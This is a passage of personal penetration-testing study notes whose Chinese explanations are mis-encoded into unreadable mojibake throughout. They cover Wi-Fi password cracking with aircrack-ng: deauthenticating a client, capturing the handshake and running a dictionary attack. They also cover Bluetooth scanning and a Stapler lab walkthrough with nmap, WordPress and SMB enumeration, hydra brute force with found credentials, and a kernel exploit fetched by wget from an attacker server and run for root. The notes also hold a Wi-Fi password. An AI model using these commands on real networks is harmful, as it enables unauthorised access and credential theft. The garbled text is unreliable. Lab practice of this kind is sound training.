iwlist wlan0 scanning
æ‰«ææ— çº¿ä¿¡å·ï¼ŒæŸ¥çœ‹å¯ä»¥æ¥å…¥çš„wifi
 Cell 02 - Address: 88:C3:97:C2:F1:4E
                    Channel:6
                    Frequency:2.437 GHz (Channel 6)
                    Quality=70/70  Signal level=-36 dBm  
                    Encryption key:on
                    ESSID:"Xiaomi_20A8"
                    Bit Rates:1 Mb/s; 2 Mb/s; 5.5 Mb/s; 11 Mb/s; 6 Mb/s
                              9 Mb/s; 12 Mb/s; 18 Mb/s
                    Bit Rates:24 Mb/s; 36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master

ä¸ºäº†è¿›è¡Œå„ç§ä¸åŒçš„å…¥ä¾µæ”»å‡»ï¼Œä½ å°†éœ€è¦
	1ï¼‰ç›®æ ‡ AP çš„ MAC åœ°ï¼ˆ BSSIDï¼‰
	2ï¼‰å®¢æˆ·ç«¯çš„ MAC åœ°å€ï¼ˆå¦ä¸€ä¸ªæ— çº¿ç½‘å¡ï¼‰
	3ï¼‰AP æ“ä½œçš„é€šé“
æ¥æ‰§è¡Œä»»ä½•ç±»å‹çš„é»‘å®¢æ”»å‡»


ï¼ˆ4ï¼‰nmcli-ç½‘ç»œç®¡ç†å™¨çš„å‘½ä»¤è¡Œæ–¹å¼
ä¸ºç½‘ç»œæ¥å£ï¼ˆåŒ…æ‹¬æ— çº¿æ¥å£ï¼‰æä¾›é«˜çº§æ¥å£çš„ Linux å®ˆæŠ¤ç¨‹åºï¼Œç§°ä¸ºç½‘ç»œç®¡ç†å™¨--nmcli

nmcli dev wifi ç±»ä¼¼äºiwlist
æŸ¥çœ‹æ— çº¿ä¿¡å·
â”Œâ”€â”€(rootğŸ’€kali2)-[~]
â””â”€# nmcli dev wifi                                        
    

nmcli dev wifi connect SSIDçš„åç§° password å¯†ç 
nmcli dev wifi connect  Xiaomi_20A8 password xiaoxiao.999

iw list  æŸ¥çœ‹æ— çº¿ç½‘å¡æ”¯æŒçš„æ¨¡å¼

Supported interface modes:
                 * IBSS
                 * managed
                 * AP
                 * AP/VLAN
                 * monitor   ******
                 * mesh point
                 * P2P-client
                 * P2P-GO
                 * outside context of a BSS

aireplay-ng -9 wlan0  //æŸ¥çœ‹æ— çº¿ç½‘å¡æ˜¯å¦æ”¯æŒæ•°æ®åŒ…çš„æ³¨å…¥åŠŸèƒ½
ioctl(SIOCSIWMODE) failed: Device or resource busy
09:04:30  Trying broadcast probe requests...
09:04:30  Injection is working!

ç¬”è®°61
### 61 day 

å¯¹æ— çº¿å¯†ç è¿›è¡Œç ´è§£

ä½¿ç”¨ aircrack-ng è¿›è¡Œ Wi-Fi ä¾¦æŸ¥

1. éœ€è¦è·å–çš„ä¿¡æ¯
åœ¨è€ƒè™‘æ”»å‡» Wi-Fi AP ä¹‹å‰ï¼Œä½ éœ€è¦
ï¼ˆ1ï¼‰ç›®æ ‡ APï¼ˆ BSSIDï¼‰çš„ MAC åœ°å€
ï¼ˆ2ï¼‰å®¢æˆ·ç«¯çš„ MAC åœ°å€
ï¼ˆ3ï¼‰AP æ­£åœ¨è¿è¡Œçš„ä¿¡é“
ï¼ˆ4ï¼‰ESSID
æ–¹æ³•ï¼šiwlist wlan0 scanning
	  nmcli dev wifi 
	  airodump-ng wlan0mon

IN-USE  BSSID              SSID                 MODE   CHAN  RATE        SIGNAL  BARS  SECURITY  
      88:C3:97:C2:F1:4E  Xiaomi_20A8           Infra     6     270 Mbit/s  100     â–‚â–„â–†â–ˆ  WPA1 WPA2 


2. éœ€è¦å‡†å¤‡
2.1 ä¸€å—èƒ½å¤Ÿæ”¯æŒï¼ˆmonitorï¼‰æ¨¡å¼å’Œæ•°æ®åŒ…æ³¨å…¥åŠŸèƒ½çš„ç½‘å¡
iw list

2.2.é¦–å…ˆéœ€è¦å°†æ— çº¿ç½‘å¡ç½®äºmonitoræ¨¡å¼ï¼Œä»¥ä¾¿ç½‘å¡èƒ½å¤Ÿçœ‹åˆ°æ‰€æœ‰ç»è¿‡å®ƒçš„æµé‡
ç›‘æ§æ¨¡å¼ç±»ä¼¼äºæœ‰çº¿ç½‘å¡ä¸Šçš„æ··æ‚æ¨¡å¼ï¼ˆpromiscuousï¼‰ã€‚
æ–¹æ³•ï¼š
è¦å°†æ— çº¿ç½‘å¡ç½®äºmonitoræ¨¡å¼ï¼Œè¯·ä½¿ç”¨ Aircrack-ng å¥—ä»¶ä¸­çš„ airmon-ng å‘½ä»¤
airmon-ng start wlan0

å°†æ— çº¿ç½‘å¡ç½®äºmonitoræ¨¡å¼ä¹‹åï¼Œairmon-ng å°†é‡å‘½åä½ çš„æ— çº¿æ¥å£å¦‚wlan0mon

iwconfig

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off



2.3 å‡†å¤‡ç›¸å…³å·¥å…·
   aircrack-ngï¼ˆå¥—ä»¶ï¼‰
   Aircrack-ng is a complete suite of tools to assess WiFi network security.
   ç”¨äºæ— çº¿ç½‘ç»œå®‰å…¨ç›¸å…³å·¥å…·çš„é›†åˆï¼ˆå¥—ä»¶ï¼‰
   ç†Ÿæ‚‰æ— çº¿ç½‘ç»œç›¸å…³çš„å‘½ä»¤
### ### 

2.4. è·å–æ•°æ®

airodump-ng å‘½ä»¤æ•è·
å¹¶æ˜¾ç¤ºæ¥è‡ªå¹¿æ’­ AP å’Œè¿æ¥åˆ°è¿™äº› AP æˆ–é™„è¿‘çš„ä»»ä½•å®¢æˆ·ç«¯çš„å…³é”®æ•°æ®
ä½¿ç”¨ï¼šï¼ˆ1ï¼‰airodump-ng wlan0mon  è·å–æ‰€æœ‰APåŠå…¶å®¢æˆ·ç«¯çš„ä¿¡æ¯
      ï¼ˆ2ï¼‰å¯¹æŒ‡å®šAPï¼ˆæ„Ÿå…´è¶£ï¼‰çš„ä¿¡æ¯è¿›è¡Œæ¢æµ‹ï¼Œè·å–åˆ°å®¢æˆ·ç«¯çš„MACåœ°å€
	  airodump-ng -c 6 --bssid 88:C3:97:C2:F1:4E wlan0mon 
	  
	  æˆ‘çš„ç¬”è®°æœ¬ï¼š18:56:80:DB:C9:19
2.5. æ— çº¿ç ´è§£
      ï¼ˆ3ï¼‰ä¿å­˜æŒ‡å®šAPçš„æŠ¥æ–‡
	  airodump-ng -c 6 --bssid 88:C3:97:C2:F1:4E  -w xiaofeixia wlan0mon

      ï¼ˆ4ï¼‰åˆ‡æ–­æŒ‡å®šå®¢æˆ·ç«¯ä¸æ— çº¿APçš„è¿æ¥
	  aireplay-ng --deauth 100 -a 88:C3:97:C2:F1:4E -c 18:56:80:DB:C9:19 wlan0mon
	  
	  --deauth  å‘é€æ–­å¼€è¿æ¥æŠ¥æ–‡çš„ä¸ªæ•°
	  -a  æŒ‡å®šçš„AP
	  -c  æŒ‡å®šçš„å®¢æˆ·ç«¯
	  
	  ä½ å¯ä»¥ä½¿ç”¨ aireplay-ng å‘½ä»¤å–æ¶ˆï¼ˆå–æ¶ˆèº«ä»½éªŒè¯ï¼‰ä¸ AP è¿æ¥çš„ä»»ä½•äººï¼Œå¹¶å¼ºåˆ¶ä»–
     ä»¬é‡æ–°èº«ä»½éªŒè¯åˆ° APï¼Œå½“ä»–ä»¬é‡æ–°éªŒè¯æ—¶ï¼Œä½ å¯ä»¥æ•è·åœ¨ WPA2-PSK å››æ¬¡æ¡æ‰‹ä¸­äº¤æ¢çš„å¯†ç æ•£
     åˆ—ã€‚
	  
	  ï¼ˆ5ï¼‰é€šè¿‡aircrack-ngä½¿ç”¨å­—å…¸ç ´è§£è·å–çš„æ— çº¿æŠ¥æ–‡
	  
	  å‡†å¤‡å¥½å­—å…¸æ–‡ä»¶wordlist.dic
	  
	  
	  aircrack-ng -w wordlist.dic -b 88:C3:97:C2:F1:4E xiaofeixia-01.cap
	  
	  -w æŒ‡å®šå­—å…¸æ–‡ä»¶  
	  -b ä½ çš„APçš„BSSID
	  xiaofeixia.cap ä¿å­˜çš„æ— çº¿æŠ¥æ–‡

### 62 day 
62.1 è“ç‰™åŸºç¡€

1.è“ç‰™æ˜¯ä¸€ç§ç”¨äºä½åŠŸè€—è¿‘åœºé€šä¿¡ï¼ˆè·ç¦»<10ç±³ï¼‰çš„é€šç”¨åè®®ï¼Œä½¿ç”¨æ‰©é¢‘åœ¨ 2.4-2.485GHz ä¸‹å·¥ä½œï¼Œè·³é¢‘é€Ÿåº¦ä¸ºæ¯ç§’ 1600è·³ï¼ˆè¿™ç§è·³é¢‘æ˜¯ä¸€ç§å®‰å…¨æªæ–½ï¼‰ã€‚
2.å®ƒç”±ç‘å…¸çˆ±ç«‹ä¿¡å…¬å¸äº 1994 å¹´å¼€å‘

3. è¿æ¥ä¸¤ä¸ªè“ç‰™è®¾å¤‡è¢«ç§°ä¸ºé…å¯¹ã€‚
å‡ ä¹ä»»ä½•ä¸¤ä¸ªè“ç‰™è®¾å¤‡éƒ½å¯ä»¥ç›¸äº’è¿æ¥ï¼Œä½†åªæœ‰åœ¨å¤„äºå¯å‘ç°æ¨¡å¼æ—¶æ‰èƒ½é…å¯¹ã€‚
å¤„äºå¯å‘ç°æ¨¡å¼çš„è“ç‰™è®¾å¤‡ä¼ è¾“ä»¥ä¸‹ä¿¡æ¯ï¼š

4. æ¯ä¸ªè®¾å¤‡éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ 48 ä½æ ‡è¯†ç¬¦ï¼ˆç±»ä¼¼äº MAC çš„åœ°å€ï¼‰ï¼Œé€šå¸¸è¿˜æœ‰ä¸€ä¸ªåˆ¶é€ å•†æŒ‡å®šçš„åç§°

5. å½“ä¸¤ä¸ªè®¾å¤‡é…å¯¹æ—¶ï¼Œå®ƒä»¬äº¤æ¢ä¸€ä¸ªå¯†é’¥æˆ–é“¾æ¥å¯†é’¥ã€‚æ¯ä¸ªå¯†é’¥å­˜å‚¨è¿™ä¸ªé“¾æ¥é”®ï¼Œä»¥ä¾¿åœ¨å°†æ¥çš„é…å¯¹ä¸­è¯†åˆ«å¦ä¸€ä¸ªã€‚
62.2 å¯¹è“ç‰™è®¾å¤‡çš„æ¢æµ‹

Linux æœ‰ä¸€ä¸ªç§°ä¸º bluez çš„è“ç‰™åè®®æ ˆçš„å®ç°
BlueZ æœ‰è®¸å¤šç®€å•çš„å·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¥ç®¡ç†å’Œæ‰«æè“ç‰™è®¾å¤‡
â”Œâ”€â”€(rootğŸ’€kali2)-[~/work/app/Empire]
â””â”€# dpkg -l | grep bluez  
ii  bluez                                  5.61-1+kali1                       amd64        Bluetooth tools and daemons

dpkg -L bluez | less  

å¸¸ç”¨çš„å·¥å…·

ï¼ˆ1ï¼‰hciconfig 
è¿™ä¸ªå·¥å…·çš„æ“ä½œä¸ Linux ä¸­çš„ ifconfig éå¸¸ç›¸ä¼¼
æŸ¥çœ‹è“ç‰™è®¾å¤‡
â”Œâ”€â”€(rootğŸ’€kali2)-[~/work/app/Empire]
â””â”€# hciconfig        
hci0:   Type: Primary  Bus: USB
        BD Address: 18:56:80:DB:C9:1D  ACL MTU: 8192:128  SCO MTU: 64:128
        DOWN 
        RX bytes:510 acl:0 sco:0 events:23 errors:0
        TX bytes:339 acl:0 sco:0 commands:23 errors:0
å¯ç”¨è“ç‰™è®¾å¤‡
 hciconfig hci0 up
 
ï¼ˆ2ï¼‰hcitool 
æ­¤æŸ¥è¯¢å·¥å…·å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›è®¾å¤‡åç§°ã€è®¾å¤‡ IDã€è®¾å¤‡ç±»åˆ«å’Œè®¾å¤‡æ—¶é’Ÿä¿¡æ¯ï¼Œä½¿è®¾å¤‡èƒ½å¤ŸåŒæ­¥å·¥ä½œã€‚

hcitool scan  æ‰«æè“ç‰™è®¾å¤‡

PS:è“ç‰™è®¾å¤‡è¦å¤„äºå‘ç°æ¨¡å¼

hcitool inq  æŸ¥è¯¢è“ç‰™è®¾å¤‡ä¿¡æ¯
å¾—åˆ°è®¾å¤‡çš„ MAC åœ°å€ã€æ—¶é’Ÿåç§»é‡å’Œè®¾å¤‡ç±»åˆ«

â”Œâ”€â”€(rootğŸ’€kali2)-[~/work/app/Empire]
â””â”€# hcitool inq 
Inquiring ...
        4C:02:20:47:90:32       clock offset: 0x0000    class: 0x5a020c
        E4:0C:FD:85:7A:20       clock offset: 0x0000    class: 0x5a020c
        E0:1F:88:E2:49:CC       clock offset: 0x0000    class: 0x5a020c
        A4:50:46:42:90:FA       clock offset: 0x0000    class: 0x5a020c
        10:F6:05:A7:54:18       clock offset: 0x0000    class: 0x5a020c
        4C:02:20:2C:78:76       clock offset: 0x0000    class: 0x5a020c
        70:66:55:0A:19:D0       clock offset: 0x0000    class: 0x2a010c
        FC:A5:D0:EE:4F:24       clock offset: 0x0000    class: 0x5a020c
   
è“ç‰™æŠ€æœ¯è”ç›Ÿï¼ˆSIGï¼‰æ˜¯ä¸€ä¸ªä»¥åˆ¶å®šè“ç‰™è§„èŒƒï¼Œä»¥æ¨åŠ¨è“ç‰™æŠ€æœ¯ä¸ºå®—æ—¨çš„è·¨å›½ç»„ç»‡ã€‚
å®ƒæ‹¥æœ‰è“ç‰™çš„å•†æ ‡ï¼Œè´Ÿè´£è®¤è¯åˆ¶é€ å‚å•†ï¼Œæˆæƒä»–ä»¬ä½¿ç”¨è“ç‰™æŠ€æœ¯ä¸è“ç‰™æ ‡å¿—ï¼Œä½†æ˜¯å®ƒæœ¬èº«ä¸è´Ÿè´£è“ç‰™è£…ç½®çš„è®¾è®¡ã€ç”Ÿäº§åŠè´©å”®ã€‚

ï¼ˆ3ï¼‰
hcidump è¿™ä¸ªå·¥å…·ä½¿æˆ‘ä»¬èƒ½å¤Ÿå—…æ¢è“ç‰™é€šä¿¡ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥æ•è·é€šè¿‡è“ç‰™ä¿¡å·å‘é€çš„æ•°æ®ã€‚



62.3. è“ç‰™æœåŠ¡å‘ç°åè®®
æœåŠ¡å‘ç°åè®®ï¼ˆ SDPï¼‰æ˜¯ä¸€ç§ç”¨äºæœç´¢è“ç‰™æœåŠ¡çš„è“ç‰™åè®®ï¼ˆè“ç‰™æ˜¯ä¸€å¥—æœåŠ¡ï¼‰
bluez æä¾›äº† sdptoolå·¥å…·ï¼Œç”¨äºæµè§ˆè®¾å¤‡ä¸Šæä¾›çš„æœåŠ¡ã€‚è¿˜éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè®¾å¤‡ä¸å¿…å¤„äºè¦æ‰«æçš„å‘ç°æ¨¡å¼ã€‚
sdptool browse 76:6E:46:63:72:66

62.4 l2ping æŸ¥çœ‹æ˜¯å¦èƒ½è¾¾åˆ°è¿œç«¯è“ç‰™è®¾å¤‡

62.5.

è“ç‰™æ”»å‡»å’Œæ¸—é€å¥—ä»¶ bluediving
https://www.github.com/balle/bluediving.git


### 63 day 
ç½‘ç»œæ¼æ´åˆ©ç”¨-Stapler
63.1. æ”¶é›†ç”¨æˆ·ç ´è§£æ‰€éœ€è¦çš„ä¿¡æ¯
ï¼ˆ1ï¼‰ç«¯å£æ‰«æ
nmap -A  -T4 192.168.195.166

nmap -sT -T4 -sV  -p-   192.168.195.131
-sT  å®Œå…¨è¿æ¥æ‰«æ 
-T4  æ‰«ææ—¶åºï¼Œæå¿«çš„æ‰«æ
-sV æŸ¥çœ‹æœåŠ¡çš„ç‰ˆæœ¬
-p  æ‰«æçš„ç«¯å£ï¼Œç«¯å£å·çš„èŒƒå›´1-65535

nmap -A  -T4 -p- -oG stapler.txt  192.168.195.166

-oG   æŠŠæ‰«æçš„ç»“æœåˆ†ç±»ä¿å­˜

FTPã€SSH åˆ©ç”¨æ–¹å¼ä¹‹ä¸€ï¼šè¿›è¡Œç”¨æˆ·çš„æš´åŠ›ç ´è§£
ç”¨æˆ·ä¿¡æ¯---æ”¶é›†
å¯†ç æ–‡ä»¶ï¼ˆå­—å…¸æ–‡ä»¶ï¼‰

		Kaliè‡ªå¸¦çš„å­—å…¸æ–‡ä»¶ï¼š/usr/share/wordlists/rockyou.txt.gz
		file rockyou.txt.gz 
		gunzip rockyou.txt.gz    
ï¼ˆ2ï¼‰è¿æ¥æ‰«æåˆ°çš„å¼€æ”¾ç«¯å£å»æ”¶é›†æœ‰ç”¨çš„ä¿¡æ¯

1ï¼‰21--FTP

æ”¯æŒåŒ¿åç™»å½•

åŒ¿åè´¦å· ftp ï¼ˆæˆ–anonymousï¼‰
ftp>
	ls  æŸ¥çœ‹
	get ä¸‹è½½
	put ä¸Šä¼ 
	cd  åˆ‡æ¢ç›®å½•
	bye  ç¦»å¼€
	lcd  æ›´æ”¹æœ¬åœ°çš„å½“å‰ç›®å½•
	
2ï¼‰22-SSH


3ï¼‰HTTP-80

Zoe

Wappalyzer:ç½‘ç«™æŠ€æœ¯åˆ†ææ’ä»¶

äº¤æ¢æœºæ¯ä¸ªç«¯å£éƒ½æ˜¯ä¸€ä¸ªå†²çªåŸŸ
HUBæ‰€æœ‰ç«¯å£åœ¨ä¸€ä¸ªå†²çªåŸŸ

### 64
64.1. CMSï¼ˆå†…å®¹ç®¡ç†ç³»ç»Ÿï¼‰
å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼Œéå¸¸é€‚åˆç”¨æ¥ç¼–è¾‘Webåº”ç”¨çš„å†…å®¹ã€‚
å¸¸ç”¨çš„CMSï¼š
ä¾‹å¦‚Drupalã€WordPressã€Magentoå’ŒJoomlaã€å¸å›½ã€ç»‡æ¢¦ç­‰

64.2 Wordpressä»‹ç»

ï¼ˆ1ï¼‰WordPressæ˜¯ä¸€ç§å¼€æºçš„CMSï¼Œå‰ç«¯ä½¿ç”¨PHPï¼Œåç«¯ä½¿ç”¨MySQLã€‚å®ƒä¸»è¦ç”¨äºåšå®¢ï¼ˆblog)ç³»ç»Ÿã€å»ºç«™
We recommend servers running version 7.4 or greater of PHP and MySQL version 5.6 OR MariaDB version 10.1 or greater.
We also recommend either Apache or Nginx as the most robust options for running WordPress, but neither is required. 

ï¼ˆ2ï¼‰WordPressäº2003å¹´5æœˆ27æ—¥ç”±å…¶åˆ›å§‹äººMatt Mullenwegå’ŒMikeLittleå‘å¸ƒã€‚

ï¼ˆ3ï¼‰å®ƒè¿˜åŒ…æ‹¬ä¸€ä¸ªæ’ä»¶ï¼ˆPluginï¼‰æ¶æ„å’Œæ¨¡æ¿ç³»ç»Ÿã€‚WordPressæ’ä»¶æ¶æ„å…è®¸ç”¨æˆ·æ‰©å±•å…¶ç½‘ç«™æˆ–åšå®¢çš„ç‰¹æ€§å’ŒåŠŸèƒ½ã€‚æˆªè‡³2019å¹´2æœˆï¼ŒWordPress.orgå…±æœ‰54 402ä¸ªå…è´¹æ’ä»¶å’Œ1500å¤šä¸ªé«˜çº§æ’ä»¶ã€‚

64.3. WordPressæ¶æ„

WordPressæ¶æ„å¯åˆ†ä¸ºå››ä¸ªä¸»è¦éƒ¨åˆ†

Â·Displayï¼ˆæ˜¾ç¤ºï¼‰ï¼šåŒ…å«ç”¨æˆ·å¯è§çš„HTMLã€CSSå’ŒJavaScriptæ–‡ä»¶ã€‚

Â·Theme/Templateï¼ˆä¸»é¢˜/æ¨¡æ¿ï¼‰ï¼šåŒ…æ‹¬è¡¨å•ã€ä¸»é¢˜æ–‡ä»¶ã€ä¸åŒçš„WordPressé¡µé¢ï¼Œä»¥åŠæ³¨é‡Šã€é¡µçœ‰ã€é¡µè„šå’Œé”™è¯¯é¡µé¢ç­‰éƒ¨åˆ†ã€‚

Â·WP-Engineï¼šè¯¥å¼•æ“è´Ÿè´£æ•´ä¸ªCMSçš„æ ¸å¿ƒåŠŸèƒ½ï¼Œä¾‹å¦‚RSS feedsã€ä¸æ•°æ®åº“é€šä¿¡ã€è®¾ç½®ã€æ–‡ä»¶ç®¡ç†ã€åª’ä½“ç®¡ç†å’Œç¼“å­˜ã€‚

Â·WP Backendï¼šåŒ…æ‹¬æ•°æ®åº“ã€PHPMailerå®šæ—¶ä»»åŠ¡å’Œæ–‡ä»¶ç³»ç»Ÿã€‚

64.4. WordPressçš„ç›®å½•ç»“æ„

ï¼ˆ1ï¼‰é…ç½®æ–‡ä»¶ï¼šwp-config.php

ï¼ˆ2ï¼‰wp-includesæ–‡ä»¶å¤¹åŒ…å«å‰ç«¯ä½¿ç”¨çš„æ‰€æœ‰å…¶ä»–PHPæ–‡ä»¶å’Œç±»ï¼Œä»¥åŠWordpress Coreæ‰€éœ€çš„ç±»ã€‚

ï¼ˆ3ï¼‰wp-admin

è¿™ä¸ªæ–‡ä»¶å¤¹åŒ…å«WordPressä»ªè¡¨æ¿ï¼ˆDashboardï¼‰çš„æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ç”¨äºæ‰§è¡Œæ‰€æœ‰ç®¡ç†ä»»åŠ¡

ï¼ˆ4ï¼‰wp-content æ–‡ä»¶å¤¹åŒ…å«æ‰€æœ‰ç”¨æˆ·ä¸Šä¼ çš„æ•°æ®


64.5. wpscan


wpscan --url https://192.168.195.166:12380/blogblog/ -e u  --disable-tls-checks
wpscan --update

64.6 ä½¿ç”¨Metasploitè¿›è¡ŒWordPressä¾¦å¯Ÿ

search wordpress_scanner type:auxiliary

	type:æ¨¡å—çš„ç±»åˆ«
	auxiliary--è¾…åŠ©æ¨¡å—
	
auxiliary/scanner/http/wordpress_scanner---
æ£€æŸ¥wordpressçš„ç‰ˆæœ¬å·ã€ä¸»é¢˜ ã€æ’ä»¶
Detects Wordpress Versions, Themes, and Plugins


1ï¼‰search wordpress_scanner type:auxiliary
2ï¼‰use auxiliary/scanner/http/wordpress_scanner
3ï¼‰info
4ï¼‰show options 
5ï¼‰set RHOSTS 192.168.195.166
   set RPORT 12380
   set TARGETURI /blogblog
   set SSL true----https
6ï¼‰run //è¿è¡Œ


65
65.1. ä½¿ç”¨Metasploitè¿›è¡ŒWordPressæšä¸¾

æ”»å‡»é¢ï¼šç”¨æˆ·ã€ä¸»é¢˜ã€æ’ä»¶

æ¨¡å—ï¼šauxiliary/scanner/http/wordpress_login_enum

WordPress Authentication Brute Force and User Enumeration Utility
use auxiliary/scanner/http/wordpress_login_enum
set BRUTEFORCE false
set THREADS    10  //è®¾ç½®çº¿ç¨‹æ•°é‡ï¼Œå½±å“çš„é€Ÿåº¦
set RHOSTS 192.168.195.166
set RPORT 12380
set TARGETURI /blogblog
set SSL true
set USER_FILE     /root/work/exam/day64/staple_user.txt 
run

65.2. Information gathering via sharesï¼ˆå…±äº«ï¼‰
åˆ©ç”¨SambaæœåŠ¡æ¥æ”¶é›†ç”¨æˆ·ä¿¡æ¯

æ–¹æ³•1ï¼šnmapçš„smbç›¸å…³çš„è„šæœ¬å¼•æ“

nmap  --script smb-os-discovery  192.168.195.166  
smb-os-discovery     æšä¸¾æ“ä½œç³»ç»Ÿ
smb-enum-shares.nse  æšä¸¾å…±äº«
smb-enum-users.nse   æšä¸¾ç”¨æˆ·

nmap  -p139 --script smb-enum-users  192.168.195.166  

æ–¹æ³•2 enum4linux 


        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))


 awk -F '\'  '{print $2}' xiao.txt | awk '{print $1}' >>staple_user.txt
 cat staple_user.txt
 wc -l staple_user.txt
 cat staple_user.txt| sort -u | wc -l
 cat staple_user.txt| sort -u  > staple_user2.txt
//sort -u å»é‡

smbclient //192.168.195.166/kathy
smbclient //192.168.195.166/tmp



Day66--æš´åŠ›ç ´è§£

å·¥å…·ï¼šhydra

hydraæ˜¯é»‘å®¢ç»„ç»‡thcçš„ä¸€æ¬¾å¼€æºå¯†ç æ”»å‡»å·¥å…·

ç”¨æˆ·ç™»å½•å£ä»¤ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§ç™»å½•åè®®å¦‚FTPã€SSHã€RDPï¼ˆè¿œç¨‹æ¡Œé¢åè®®ï¼‰ç­‰

hydra -h 

Options:
  -R        restore a previous aborted/crashed session
  æ¢å¤ä¹‹å‰ä¸­æ–­çš„ä¼šè¯
  -I        ignore an existing restore file (don't wait 10 seconds)
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -y        disable use of symbols in bruteforce, see above
  -r             rainy mode for password generation (-x)
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
  -c TIME   wait time per login attempt over all threads (enforces -t 1)
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
  -O        use old SSL v2 and v3
  -K        do not redo failed attempts (good for -M mass scanning)
  -q        do not print messages about connection errors
  -U        service module usage details
  -m OPT    options specific for a module, see -U output for information
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)
Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh


ç”¨ç¤º:
hydra -e nsr -L staple_user2.txt 192.168.195.131 ftp
hydra -e nsr -L username ftp://192.168.195.131

-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE

-l  ç”¨æˆ·
-L  ç”¨æˆ·æ–‡ä»¶

-p PASS  or -P FILE  try password PASS, or load several passwords from FILE
-p  å¯†ç 
-P  å¯†ç æ–‡ä»¶

 -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
 
  n ç©ºå¯†ç 
  s ç”¨æˆ·åå³å¯†ç 
  r å¯†ç å’Œç”¨æˆ·åç›¸å

[21][ftp] host: 192.168.195.166   login: elly   password: ylle
[21][ftp] host: 192.168.195.166   login: SHayslett   password: SHayslett

SSH
cat passwd | grep 'sh$' | awk -F: '{print $1}'  >>staple_user2.txt

  -t TASKS  run TASKS number of connects in parallel per target (default: 16)

hydra -e nsr -L ssh_user.txt 192.168.195.166 ssh -t 4 

[22][ssh] host: 192.168.195.166   login: SHayslett   password: SHayslett

hydra  -L ssh_user.txt -P /usr/share/wordlists/rockyou.txt 192.168.195.166 ssh -t 20

Linux ææƒ 
åˆ©ç”¨Linuxå†…æ ¸æ¼æ´è¿›è¡Œææƒ
åˆ©ç”¨å†…æ ¸æ˜¯æå‡ç‰¹æƒçš„ä¸€ç§æå¥½çš„æ–¹å¼ï¼Œä½†æˆåŠŸå¯èƒ½ä¸ä»…å–å†³äºåŒ¹é…ç›®æ ‡çš„å†…æ ¸ç‰ˆæœ¬ï¼Œè¿˜å–å†³äºæ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆæœ¬
è¦æ”¶é›†çš„ä¿¡æ¯ï¼š
ï¼ˆ1ï¼‰å†…æ ¸ç‰ˆæœ¬   4.4.0-21-generic
ï¼ˆ2ï¼‰æ“ä½œç³»ç»Ÿå‘è¡Œç‰ˆæœ¬  Ubuntu 16.04
ï¼ˆ3ï¼‰æ¶æ„ i686--32ä½

æ–¹æ³•1 æ£€æµ‹/etc/issueæ–‡ä»¶

/etc/issueæ–‡ä»¶ï¼ŒåŒ…å«ç³»ç»Ÿç™»å½•çš„æç¤ºä¿¡æ¯ï¼Œå¾€å¾€ä¼šæœ‰ç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯

æ–¹æ³•2ï¼šcat /etc/*-release
       lsb_release -a

Ubuntu 16.04 LTS


æ–¹æ³•3ï¼š uname -r

æ–¹æ³•4ï¼š  uname -m
		 arch
æ ¹æ®æ”¶é›†çš„ä¿¡æ¯æŸ¥æ‰¾æ¼æ´

searchsploit linux kernel ubuntu 16.04

ubuntu 16.0.4 site:exploit-db.com

https://www.exploit-db.com/

https://www.seebug.org/

### *day67æ¼æ´åˆ©ç”¨
step01
ssh SHayslett@192.168.195.166
å¯†ç ï¼šSHayslett
Step02: åœ¨Kaliä¸­æ­å»ºä¸€ä¸ªç®€æ˜“çš„HTTPæœåŠ¡å™¨ï¼ˆ192.168.195.76ï¼‰
python -m SimpleHTTPServer 8088
PSï¼šå½“å‰ç›®å½•å°±æ˜¯ç½‘ç«™çš„æ ¹ç›®å½•

Step03 : åœ¨é¶æœºï¼ˆStaplerï¼‰æŠŠä»£ç ä¸‹è½½åˆ°æœ¬åœ°
cd /tmp
wget http://192.168.195.76:8088/39772.zip
unzip 39772.zip
cd 39772
tar xf exploit.tar
cd ebpf_mapfd_doubleput_exploit/
./compile.sh 
./doubleput 
id
cd /root
cat flag.txt
*****

æ€»ç»“ï¼š

